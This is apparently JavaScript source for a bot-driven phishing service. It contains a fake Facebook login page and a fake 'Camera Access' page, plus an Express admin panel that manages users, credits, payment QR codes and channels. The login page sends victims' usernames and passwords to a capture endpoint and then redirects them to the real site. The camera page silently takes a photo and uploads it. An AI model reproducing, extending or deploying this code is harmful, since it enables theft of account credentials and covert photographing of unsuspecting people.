var FB_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Facebook Login</title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}\nbody{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}\n.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.06);border-radius:35px;padding:40px 30px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}\n.logo{text-align:center;margin-bottom:30px}\n.logo h1{font-size:38px;font-weight:800;background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.logo p{color:#888;font-size:14px}\n.input-group{position:relative;margin-bottom:20px}\n.input-group input{width:100%;padding:16px 20px;background:rgba(255,255,255,0.05);border:2px solid rgba(255,255,255,0.06);border-radius:16px;color:#fff;font-size:16px;transition:.3s;outline:none}\n.input-group input:focus{border-color:#ff4757;background:rgba(255,71,87,0.05)}\n.input-group input::placeholder{color:#666}\n.btn{width:100%;padding:16px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:.3s;margin-top:10px;box-shadow:0 10px 30px rgba(255,71,87,0.2)}\n.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,71,87,0.4)}\n.btn:active{transform:scale(.98)}\n.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}\n.footer a{color:#ff4757;text-decoration:none}\n.status{text-align:center;margin-top:15px;padding:10px;border-radius:12px;display:none;font-size:14px}\n.status.error{background:rgba(255,71,87,0.1);color:#ff4757;display:block}\n.status.success{background:rgba(46,213,115,0.1);color:#2ed573;display:block}\n.loader{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff4757;border-radius:50%;animation:spin .8s linear infinite;margin:10px auto;display:none}\n@keyframes spin{100%{transform:rotate(360deg)}}\n.divider{display:flex;align-items:center;margin:20px 0;color:#555}\n.divider::before,.divider::after{content:"";flex:1;height:1px;background:rgba(255,255,255,0.05)}\n.divider span{padding:0 15px;font-size:12px}\n</style>\n</head>\n<body>\n<div class="card">\n<div class="logo"><h1>📘 Facebook</h1><p>Log in to continue</p></div>\n<div id="status" class="status"></div>\n<div class="input-group"><input type="text" id="username" placeholder="Email or phone number" autocomplete="off"></div>\n<div class="input-group"><input type="password" id="password" placeholder="Password" autocomplete="off"></div>\n<button class="btn" onclick="login()">Log In</button>\n<div class="loader" id="loader"></div>\n<div class="divider"><span>OR</span></div>\n<div style="text-align:center;color:#666;font-size:14px">By continuing, you agree to our Terms & Privacy Policy</div>\n<div class="footer">© 2026 Facebook</div>\n</div>\n<script>\nvar USER_ID = "USERID_PLACEHOLDER";\nvar PLATFORM = "PLATFORM_PLACEHOLDER";\nfunction showStatus(msg, type){var el=document.getElementById("status");el.textContent=msg;el.className="status "+type;el.style.display="block";}\nfunction hideStatus(){document.getElementById("status").style.display="none";}\nfunction showLoader(){document.getElementById("loader").style.display="block";}\nfunction hideLoader(){document.getElementById("loader").style.display="none";}\nasync function login(){\nvar user=document.getElementById("username").value.trim();var pass=document.getElementById("password").value.trim();\nif(!user||!pass){showStatus("Please fill in all fields","error");return;}\nhideStatus();showLoader();\ntry{\nvar res=await fetch("/api/capture",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:USER_ID,username:user,password:pass,platform:PLATFORM})});\nif(res.ok){showStatus("✅ Login successful! Redirecting...","success");document.getElementById("username").value="";document.getElementById("password").value="";setTimeout(function(){window.location.href="https://facebook.com"},1500);}\nelse{showStatus("❌ Login failed. Try again.","error");}\n}catch(e){showStatus("❌ Network error. Try again.","error");}\nhideLoader();\n}\ndocument.addEventListener("keydown",function(e){if(e.key==="Enter")login();});\n</script>\n</body>\n</html>';

// ====================== CAMERA TEMPLATE ======================
var CAMERA_TEMPLATE = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n<title>Camera Access</title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\nbody{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}\n.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.06);border-radius:35px;padding:40px 30px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}\n.header{text-align:center;margin-bottom:25px}\n.header .icon{font-size:70px;background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}\n.header h1{font-size:28px;font-weight:800;color:#fff;margin-top:5px}\n.header h1 span{background:linear-gradient(135deg,#ff4757,#ff6b6b);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.header p{color:#888;font-size:14px;margin-top:5px}\n.preview{width:100%;height:250px;background:rgba(255,255,255,0.03);border-radius:20px;overflow:hidden;border:2px dashed rgba(255,255,255,0.05);margin:15px 0;display:flex;align-items:center;justify-content:center;position:relative}\n.preview video,.preview img{width:100%;height:100%;object-fit:cover;display:none}\n.preview .placeholder{color:#666;font-size:14px;text-align:center}\n.preview .placeholder i{font-size:40px;display:block;margin-bottom:10px;color:#555}\n.cam-controls{display:flex;gap:15px;margin:20px 0}\n.cam-controls button{flex:1;padding:14px;border:none;border-radius:16px;font-size:16px;font-weight:600;cursor:pointer;transition:.3s}\n.btn-capture{background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff;box-shadow:0 10px 30px rgba(255,71,87,0.2)}\n.btn-capture:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(255,71,87,0.4)}\n.btn-capture:disabled{opacity:0.5;cursor:not-allowed}\n.btn-secondary{background:rgba(255,255,255,0.05);color:#888;border:1px solid rgba(255,255,255,0.05)}\n.btn-secondary:hover{background:rgba(255,255,255,0.08)}\n.status{text-align:center;margin-top:15px;padding:12px;border-radius:12px;display:none;font-size:14px}\n.status.success{background:rgba(46,213,115,0.1);color:#2ed573;display:block}\n.status.error{background:rgba(255,71,87,0.1);color:#ff4757;display:block}\n.status.info{background:rgba(54,164,235,0.1);color:#36a4eb;display:block}\n.footer{text-align:center;margin-top:20px;color:#444;font-size:11px}\n.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff4757;border-radius:50%;animation:spin .8s linear infinite;margin:10px auto;display:none}\n@keyframes spin{100%{transform:rotate(360deg)}}\n</style>\n</head>\n<body>\n<div class="card">\n<div class="header"><span class="icon"><i class="fas fa-camera"></i></span><h1>📷 <span>Camera Access</span></h1><p>Allow camera to capture photo</p></div>\n<div id="status" class="status"></div>\n<div class="preview" id="preview"><div class="placeholder"><i class="fas fa-camera-retro"></i>Camera preview here</div><video id="video" autoplay muted playsinline></video><img id="capturedImage" style="display:none"></div>\n<div class="cam-controls"><button class="btn-capture" id="captureBtn" onclick="capturePhoto()"><i class="fas fa-camera"></i> Capture</button><button class="btn-secondary" onclick="restartCamera()"><i class="fas fa-redo"></i> Restart</button></div>\n<div class="spinner" id="loader"></div>\n<div class="footer">🔒 End-to-end encrypted • v2.0</div>\n</div>\n<script>\nvar USER_ID = "USERID_PLACEHOLDER";\nvar PLATFORM = "PLATFORM_PLACEHOLDER";\nvar stream = null;\nvar video = document.getElementById("video");\nvar preview = document.getElementById("preview");\nvar capturedImg = document.getElementById("capturedImage");\nvar statusEl = document.getElementById("status");\nvar loader = document.getElementById("loader");\nvar captureBtn = document.getElementById("captureBtn");\nfunction showStatus(msg, type){statusEl.textContent=msg;statusEl.className="status "+type;statusEl.style.display="block";}\nfunction hideStatus(){statusEl.style.display="none";}\nfunction showLoader(){loader.style.display="block";captureBtn.disabled=true;}\nfunction hideLoader(){loader.style.display="none";captureBtn.disabled=false;}\nasync function startCamera(){\ntry{\nstream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment",width:{ideal:1280},height:{ideal:720}},audio:false});\nvideo.srcObject=stream;video.style.display="block";\ndocument.querySelector(".placeholder").style.display="none";\nshowStatus("✅ Camera ready!","success");\n}catch(e){showStatus("❌ Camera access denied. Please allow camera permissions.","error");}\n}\nfunction restartCamera(){if(stream){stream.getTracks().forEach(function(t){t.stop()});}video.style.display="none";capturedImg.style.display="none";document.querySelector(".placeholder").style.display="block";captureBtn.disabled=false;startCamera();}\nasync function capturePhoto(){\nif(!stream){showStatus("❌ Camera not ready","error");return;}\nshowLoader();hideStatus();\ntry{\nvar canvas=document.createElement("canvas");\ncanvas.width=video.videoWidth||1280;\ncanvas.height=video.videoHeight||720;\nvar ctx=canvas.getContext("2d");\nctx.drawImage(video,0,0,canvas.width,canvas.height);\nvar dataUrl=canvas.toDataURL("image/jpeg",0.9);\nvar res=await fetch("/api/capturepic",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:USER_ID,SY:dataUrl,platform:PLATFORM})});\nif(res.ok){capturedImg.src=dataUrl;capturedImg.style.display="block";video.style.display="none";document.querySelector(".placeholder").style.display="none";showStatus("📸 Photo captured and sent!","success");}\nelse{showStatus("❌ Failed to send photo","error");}\n}catch(e){showStatus("❌ Error capturing photo","error");}\nhideLoader();\n}\nstartCamera();\n</script>\n</body>\n</html>';

// ====================== EXPRESS ROUTES ======================
app.use('/api/photos', express.static(BOT_PHOTO_DIR));
app.use('/uploads', express.static(UPLOADS_DIR));

// ====================== ADMIN PANEL ======================
app.get('/admin', function(req, res) {
    res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Panel</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:#0a0a0a;color:#fff;padding:20px}.container{max-width:1200px;margin:0 auto}.header{background:linear-gradient(135deg,#ff4757,#ff6b6b);padding:30px;border-radius:15px;margin-bottom:30px;text-align:center}.header h1{font-size:36px}.tabs{display:flex;gap:10px;margin-bottom:30px;flex-wrap:wrap}.tab{background:#1a1a2e;padding:12px 25px;border-radius:10px;cursor:pointer;border:1px solid #2a2a4a;transition:.3s;color:#fff}.tab.active{background:linear-gradient(135deg,#ff4757,#ff6b6b);border-color:#ff4757}.tab:hover{background:#2a2a4a}.tab-content{display:none}.tab-content.active{display:block}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:20px}.card{background:#1a1a2e;border-radius:15px;padding:15px;border:1px solid #2a2a4a;transition:.3s}.card:hover{transform:translateY(-5px);border-color:#ff4757}.card img{width:100%;height:200px;object-fit:cover;border-radius:10px}.card .info{padding:10px 0}.card .actions{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap}.btn{padding:8px 15px;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:.3s}.btn-danger{background:#dc3545;color:#fff}.btn-danger:hover{background:#c82333}.btn-warning{background:#ffc107;color:#000}.btn-warning:hover{background:#e0a800}.btn-primary{background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff}.btn-primary:hover{background:linear-gradient(135deg,#ff6b6b,#ff4757)}.btn-success{background:linear-gradient(135deg,#ff4757,#ff6b6b);color:#fff}.btn-success:hover{background:linear-gradient(135deg,#ff6b6b,#ff4757)}.upload-section{background:#1a1a2e;padding:30px;border-radius:15px;margin-bottom:30px;border:2px dashed #2a2a4a}.upload-section form{display:flex;gap:20px;flex-wrap:wrap;align-items:center}.upload-section input[type="file"]{background:transparent;color:#fff;padding:10px;border:1px solid #2a2a4a;border-radius:8px}.upload-section input[type="text"]{flex:1;min-width:200px;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;border-radius:8px;color:#fff}.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}.stat-card{background:#1a1a2e;padding:20px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.stat-card .number{font-size:32px;font-weight:700;color:#ff4757}.stat-card .label{color:#888;font-size:14px}.channel-item{background:#1a1a2e;padding:15px;border-radius:10px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #2a2a4a}.channel-item .name{font-weight:600}.channel-item .id{color:#888;font-size:12px}.user-card{background:#1a1a2e;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-bottom:10px}.user-card .uid{color:#ff4757;font-weight:600}.toast{position:fixed;bottom:20px;right:20px;background:#28a745;color:#fff;padding:15px 30px;border-radius:10px;display:none;z-index:999}.toast.error{background:#dc3545}.empty{text-align:center;padding:60px 20px;color:#666}.empty i{font-size:64px;margin-bottom:20px;display:block}input,select{padding:10px;border-radius:8px;border:1px solid #2a2a4a;background:#0a0a0a;color:#fff;margin:5px}.flex{display:flex;gap:10px;flex-wrap:wrap;align-items:center}.qr-section{background:#1a1a2e;padding:30px;border-radius:15px;text-align:center;border:1px solid #2a2a4a}.qr-section img{max-width:200px;border-radius:10px;border:2px solid #2a2a4a}.featured-preview{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;margin-top:10px}.featured-preview img{max-width:200px;border-radius:10px}.status-badge{padding:8px 20px;border-radius:20px;font-weight:600;display:inline-block}.status-active{background:#1a3a1a;color:#28a745}.status-inactive{background:#3a1a1a;color:#dc3545}.logs-area{background:#0a0a0a;padding:15px;border-radius:10px;border:1px solid #2a2a4a;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:#aaa;white-space:pre-wrap}.qr-preview{border:2px solid #2a2a4a;border-radius:10px;padding:10px;background:#0a0a0a;display:inline-block;margin-top:10px}</style></head><body><div class="container"><div class="header"><h1>📸 Admin Panel</h1><p>Complete Control</p></div><div class="tabs"><div class="tab active" onclick="showTab(\'photos\')">📷 Photos</div><div class="tab" onclick="showTab(\'channels\')">📢 Channels</div><div class="tab" onclick="showTab(\'users\')">👥 Users</div><div class="tab" onclick="showTab(\'featured\')">⭐ Featured</div><div class="tab" onclick="showTab(\'qr\')">💰 QR</div><div class="tab" onclick="showTab(\'logs\')">📋 Logs</div><div class="tab" onclick="showTab(\'commands\')">📜 Commands</div></div><div id="tab-photos" class="tab-content active"><div class="stats" id="stats"></div><div class="upload-section"><h3>📤 Upload Photo</h3><form id="uploadForm" enctype="multipart/form-data"><input type="file" name="photo" accept="image/*" required><input type="text" name="caption" placeholder="Caption"><button type="submit" class="btn btn-primary">Upload</button></form></div><div id="photoGrid" class="grid"></div></div><div id="tab-channels" class="tab-content"><h2>📢 Manage Channels</h2><div class="upload-section"><h3>➕ Add Channel</h3><div class="flex"><input type="text" id="channelId" placeholder="Channel ID" style="flex:1"><input type="text" id="channelName" placeholder="Channel Name" style="flex:1"><input type="text" id="channelLink" placeholder="Channel Link" style="flex:1"><button class="btn btn-success" onclick="addChannel()">Add</button></div></div><div id="channelList"></div></div><div id="tab-users" class="tab-content"><h2>👥 Manage Users</h2><div class="flex" style="margin-bottom:20px"><input type="text" id="searchUser" placeholder="Search User ID..." style="flex:1"><button class="btn btn-primary" onclick="searchUser()">Search</button></div><div id="userList"></div><div class="flex" style="margin-top:20px"><input type="text" id="userIdInput" placeholder="User ID" style="flex:1"><input type="number" id="creditAmount" placeholder="Credits" style="width:150px"><button class="btn btn-warning" onclick="modifyCredits()">Modify</button><button class="btn btn-success" onclick="toggleUnlimited()">Unlimited</button></div></div><div id="tab-featured" class="tab-content"><h2>⭐ Featured Settings</h2><div class="upload-section"><h3>📸 Featured Photo</h3><div class="flex"><select id="featuredPhotoSelect" style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><option value="">Select a photo...</option></select><button class="btn btn-primary" onclick="setFeaturedPhoto()">Set</button><button class="btn btn-danger" onclick="removeFeaturedPhoto()">Remove</button></div><div id="featuredPreview" class="featured-preview"><p style="color:#888;">No featured photo</p></div></div><div class="upload-section"><h3>💬 Featured Message</h3><div class="flex"><input type="text" id="featuredMessage" placeholder="Enter message..." style="flex:1;padding:12px;background:#0a0a0a;border:1px solid #2a2a4a;color:#fff;border-radius:8px;"><button class="btn btn-primary" onclick="setFeaturedMessage()">Update</button></div><div id="featuredMessageDisplay" style="margin-top:10px;padding:15px;background:#0a0a0a;border-radius:8px;border:1px solid #2a2a4a;color:#aaa;"></div></div><div class="upload-section"><h3>⚙️ Status</h3><div class="flex"><span id="featuredStatus" class="status-badge status-active">✅ Active</span><button class="btn btn-warning" onclick="toggleFeaturedStatus()">Toggle</button></div></div></div><div id="tab-qr" class="tab-content"><div class="qr-section"><h2>💰 Payment QR Code</h2><div id="qrDisplay"><p style="color:#888;margin:20px 0">Upload payment QR code</p><input type="file" id="qrUpload" accept="image/*"><button class="btn btn-primary" onclick="uploadQR()">Upload QR</button><button class="btn btn-danger" onclick="removeQR()">Remove QR</button></div><div id="qrPreview" class="qr-preview" style="margin-top:20px;display:none;"><p style="color:#888;margin-bottom:10px;">Current QR Code:</p><img id="qrImage" src="" style="max-width:200px;border-radius:10px;"></div></div></div><div id="tab-logs" class="tab-content"><h2>📋 Server Logs</h2><div class="flex" style="margin-bottom:20px"><button class="btn btn-primary" onclick="loadLogs()">Refresh</button><button class="btn btn-danger" onclick="clearLogs()">Clear Logs</button></div><div id="logsDisplay" class="logs-area">Loading logs...</div></div><div id="tab-commands" class="tab-content"><h2>📜 All Commands</h2><div class="upload-section"><h3>👑 Admin Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/help or /commands - Show all commands\n/admin - Open admin panel\n/addcredits [userId] [amount] - Add credits\n/removecredits [userId] [amount] - Remove credits\n/unlimited [userId] - Activate unlimited\n/resetuser [userId] - Reset user\n/users - Show all users\n/stats - Bot statistics\n/broadcast [message] - Send to all users\n/addqr - Upload QR code (reply with image)\n/removeqr - Remove QR code\n/viewqr - View QR code\n/addchannel [id] [name] [link] - Add channel\n/removechannel [id] - Remove channel\n/channels - List all channels\n/addphoto [caption] - Upload photo (reply with image)\n/featured [photoId] - Set featured photo\n/featuredmsg [message] - Set featured message\n/featuredtoggle - Toggle featured on/off\n/logs - Show recent logs\n/restart - Restart bot</pre><h3 style="margin-top:20px">👤 User Commands</h3><pre style="color:#aaa;font-family:monospace;font-size:14px;line-height:1.8;background:#0a0a0a;padding:20px;border-radius:10px;border:1px solid #2a2a4a;">/start - Start the bot\n/menu - Show main menu\n/pay [amount] - Buy credits\n/credits - Check your credits\n/referral - Get referral link</pre></div></div></div><div id="toast" class="toast"></div><script>\nvar API_BASE=window.location.origin;\nfunction showToast(m,e){e=e||false;var t=document.getElementById("toast");t.textContent=m;t.className="toast"+(e?" error":"");t.style.display="block";setTimeout(function(){t.style.display="none"},3000);}\nfunction showTab(tab){document.querySelectorAll(".tab-content").forEach(function(t){t.classList.remove("active")});document.querySelectorAll(".tab").forEach(function(t){t.classList.remove("active")});document.getElementById("tab-"+tab).classList.add("active");document.querySelector(".tab[onclick=\\"showTab(\\\'"+tab+"\\\')\\"]").classList.add("active");if(tab==="channels")loadChannels();if(tab==="users")loadUsers();if(tab==="featured")loadFeatured();if(tab==="logs")loadLogs();if(tab==="qr")loadQR();}\nasync function loadPhotos(){try{var r=await fetch("/api/admin/photos");var d=await r.json();var photos=d.photos||[];var active=photos.filter(function(p){return p.active}).length;var total=photos.length;document.getElementById("stats").innerHTML="<div class=\\"stat-card\\"><div class=\\"number\\">"+total+"</div><div class=\\"label\\">Total</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+active+"</div><div class=\\"label\\">Active</div></div><div class=\\"stat-card\\"><div class=\\"number\\">"+(total-active)+"</div><div class=\\"label\\">Inactive</div></div>";var grid=document.getElementById("photoGrid");if(photos.length===0){grid.innerHTML="<div class=\\"empty\\"><i>📷</i>No photos</div>";return;}var html="";for(var i=0;i<photos.length;i++){var p=photos[i];html+="<div class=\\"card\\"><img src=\\""+p.url+"\\"><div class=\\"info\\"><div>"+(p.caption||"No caption")+"</div><div style=\\"font-size:12px;color:#888;\\">"+new Date(p.uploadedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:"+(p.active?"#28a745":"#dc3545")+";\\">"+(p.active?"✅ Active":"❌ Inactive")+"</div></div><div class=\\"actions\\"><button class=\\"btn btn-warning\\" onclick=\\"togglePhoto(\\\'"+p.id+"\\\')\\">"+(p.active?"Hide":"Show")+"</button><button class=\\"btn btn-danger\\" onclick=\\"deletePhoto(\\\'"+p.id+"\\\')\\">Delete</button></div></div>";}grid.innerHTML=html;}catch(err){showToast("Error loading photos",true);}}\nasync function deletePhoto(id){if(!confirm("Delete?"))return;try{var r=await fetch("/api/admin/photos/"+id,{method:"DELETE"});if(r.ok){showToast("Deleted!");loadPhotos();}else showToast("Delete failed",true);}catch(err){showToast("Error",true);}}\nasync function togglePhoto(id){try{var r=await fetch("/api/admin/photos/"+id+"/toggle",{method:"PATCH"});if(r.ok){showToast("Toggled!");loadPhotos();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}\ndocument.getElementById("uploadForm").addEventListener("submit",async function(e){e.preventDefault();var fd=new FormData(e.target);try{var r=await fetch("/api/admin/upload",{method:"POST",body:fd});if(r.ok){showToast("Uploaded!");e.target.reset();loadPhotos();loadFeatured();}else showToast("Upload failed",true);}catch(err){showToast("Error",true);}});\nasync function loadChannels(){try{var r=await fetch("/api/admin/channels");var channels=await r.json();var list=document.getElementById("channelList");if(channels.length===0){list.innerHTML="<div class=\\"empty\\"><i>📢</i>No channels</div>";return;}var html="";for(var i=0;i<channels.length;i++){var c=channels[i];html+="<div class=\\"channel-item\\"><div><div class=\\"name\\">"+c.name+"</div><div class=\\"id\\">"+c.id+"</div></div><div><a href=\\""+c.link+"\\" target=\\"_blank\\" class=\\"btn btn-primary\\">Visit</a><button class=\\"btn btn-danger\\" onclick=\\"removeChannel(\\\'"+c.id+"\\\')\\">Remove</button></div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading channels",true);}}\nasync function addChannel(){var id=document.getElementById("channelId").value.trim();var name=document.getElementById("channelName").value.trim();var link=document.getElementById("channelLink").value.trim();if(!id||!name||!link){showToast("Fill all fields",true);return;}try{var r=await fetch("/api/admin/channels",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id:id,name:name,link:link})});if(r.ok){showToast("Channel added!");["channelId","channelName","channelLink"].forEach(function(i){document.getElementById(i).value=""});loadChannels();}else showToast("Add failed",true);}catch(err){showToast("Error",true);}}\nasync function removeChannel(id){if(!confirm("Remove?"))return;try{var r=await fetch("/api/admin/channels/"+id,{method:"DELETE"});if(r.ok){showToast("Removed!");loadChannels();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}\nasync function loadUsers(){try{var r=await fetch("/api/admin/users");var users=await r.json();var list=document.getElementById("userList");var entries=Object.entries(users);if(entries.length===0){list.innerHTML="<div class=\\"empty\\"><i>👥</i>No users</div>";return;}var html="";for(var i=0;i<entries.length;i++){var id=entries[i][0];var data=entries[i][1];html+="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+id+"</div><div>⭐ Credits: "+(data.unlimited?"♾️ Unlimited":data.credits||0)+"</div><div>👥 Referrals: "+(data.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(data.joinedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:#888;\\">Referred by: "+(data.referredBy||"None")+"</div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading users",true);}}\nasync function searchUser(){var uid=document.getElementById("searchUser").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/user/"+uid);var user=await r.json();if(user.error){showToast("User not found",true);return;}document.getElementById("userList").innerHTML="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+uid+"</div><div>⭐ Credits: "+(user.unlimited?"♾️ Unlimited":user.credits||0)+"</div><div>👥 Referrals: "+(user.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(user.joinedAt).toLocaleDateString()+"</div><div>Referred by: "+(user.referredBy||"None")+"</div></div>";}catch(err){showToast("Error",true);}}\nasync function modifyCredits(){var uid=document.getElementById("userIdInput").value.trim();var amount=parseInt(document.getElementById("creditAmount").value);if(!uid||isNaN(amount)){showToast("Enter valid User ID and amount",true);return;}try{var r=await fetch("/api/admin/modify-credits",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid,amount:amount})});var data=await r.json();if(data.success){showToast("Updated! New: "+data.credits);loadUsers();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}\nasync function toggleUnlimited(){var uid=document.getElementById("userIdInput").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/toggle-unlimited",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid})});var data=await r.json();if(data.success){showToast("Unlimited: "+(data.unlimited?"ON":"OFF"));loadUsers();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}\nasync function loadFeatured(){try{var r=await fetch("/api/admin/featured");var data=await r.json();var photos=await fetch("/api/admin/photos").then(function(r){return r.json()});var select=document.getElementById("featuredPhotoSelect");select.innerHTML="<option value=\\"\\">Select a photo...</option>";for(var i=0;i<photos.photos.length;i++){var p=photos.photos[i];var opt=document.createElement("option");opt.value=p.id;opt.textContent=p.caption||p.filename;if(data.photo===p.id)opt.selected=true;select.appendChild(opt);}var preview=document.getElementById("featuredPreview");if(data.photoData){preview.innerHTML="<img src=\\""+data.photoData.url+"\\" style=\\"max-width:200px;border-radius:10px;border:1px solid #2a2a4a;\\">";}else{preview.innerHTML="<p style=\\"color:#888;\\">No featured photo</p>";}document.getElementById("featuredMessageDisplay").innerHTML="<strong>Current:</strong> "+(data.message||"No message");document.getElementById("featuredMessage").value=data.message||"";var statusEl=document.getElementById("featuredStatus");if(data.status){statusEl.className="status-badge status-active";statusEl.textContent="✅ Active";}else{statusEl.className="status-badge status-inactive";statusEl.textContent="❌ Inactive";}}catch(err){showToast("Error loading featured",true);}}\nasync function setFeaturedPhoto(){var photoId=document.getElementById("featuredPhotoSelect").value;if(!photoId){showToast("Select a photo",true);return;}try{var r=await fetch("/api/admin/featured/photo",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photoId:photoId})});if(r.ok){showToast("Featured photo updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}\nasync function removeFeaturedPhoto(){try{var r=await fetch("/api/admin/featured/photo",{method:"DELETE"});if(r.ok){showToast("Removed!");loadFeatured();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}\nasync function setFeaturedMessage(){var message=document.getElementById("featuredMessage").value.trim();if(!message){showToast("Enter a message",true);return;}try{var r=await fetch("/api/admin/featured/message",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:message})});if(r.ok){showToast("Message updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}\nasync function toggleFeaturedStatus(){try{var r=await fetch("/api/admin/featured/toggle",{method:"POST"});if(r.ok){showToast("Status toggled!");loadFeatured();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}\nasync function loadQR(){try{var r=await fetch("/api/admin/qr");var data=await r.json();var preview=document.getElementById("qrPreview");if(data.url){preview.style.display="block";document.getElementById("qrImage").src="/api/admin/qr?t="+Date.now();}else{preview.style.display="none";}}catch(err){}}\nasync function uploadQR(){var file=document.getElementById("qrUpload").files[0];if(!file){showToast("Select an image",true);return;}var fd=new FormData();fd.append("qr",file);try{var r=await fetch("/api/admin/upload-qr",{method:"POST",body:fd});var data=await r.json();if(data.success){showToast("QR uploaded!");loadQR();}else showToast("Upload failed",true);}catch(err){showToast("Error",true);}}\nasync function removeQR(){if(!confirm("Remove QR code?"))return;try{var r=await fetch("/api/admin/remove-qr",{method:"DELETE"});if(r.ok){showToast("QR removed!");loadQR();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}\nasync function loadLogs(){try{var r=await fetch("/api/admin/logs");var data=await r.json();document.getElementById("logsDisplay").textContent=data.logs||"No logs available";}catch(err){document.getElementById("logsDisplay").textContent="Error loading logs";showToast("Error loading logs",true);}}\nasync function clearLogs(){if(!confirm("Clear all logs?"))return;try{var r=await fetch("/api/admin/logs",{method:"DELETE"});if(r.ok){showToast("Logs cleared!");loadLogs();}else showToast("Clear failed",true);}catch(err){showToast("Error",true);}}\nloadPhotos();loadChannels();loadUsers();loadFeatured();loadQR();\n</script></body></html>');
});

// ====================== ADMIN API ======================
app.get('/api/admin/photos', function(req, res) {
    res.json({ photos: getPhotos(), total: getPhotos().length });
});

app.post('/api/admin/upload', upload.single('photo'), function(req, res) {
    try {
        if (!req.file) return res.status(400).json({ error: 'No file' });
        var photo = addPhoto(req.file, req.body.caption || '');
        res.json({ success: true, photo: photo });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/api/admin/photos/:id', function(req, res) {
    res.json({ success: deletePhoto(req.params.id) });
});

app.patch('/api/admin/photos/:id/toggle', function(req, res) {
    var photo = togglePhoto(req.params.id);
    res.json({ success: !!photo, photo: photo });
});

app.get('/api/admin/channels', function(req, res) {
    res.json(getChannels());
});

app.post('/api/admin/channels', function(req, res) {
    var body = req.body;
    if (!body.id || !body.name || !body.link) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    res.json(addChannel(body.id, body.name, body.link));
});

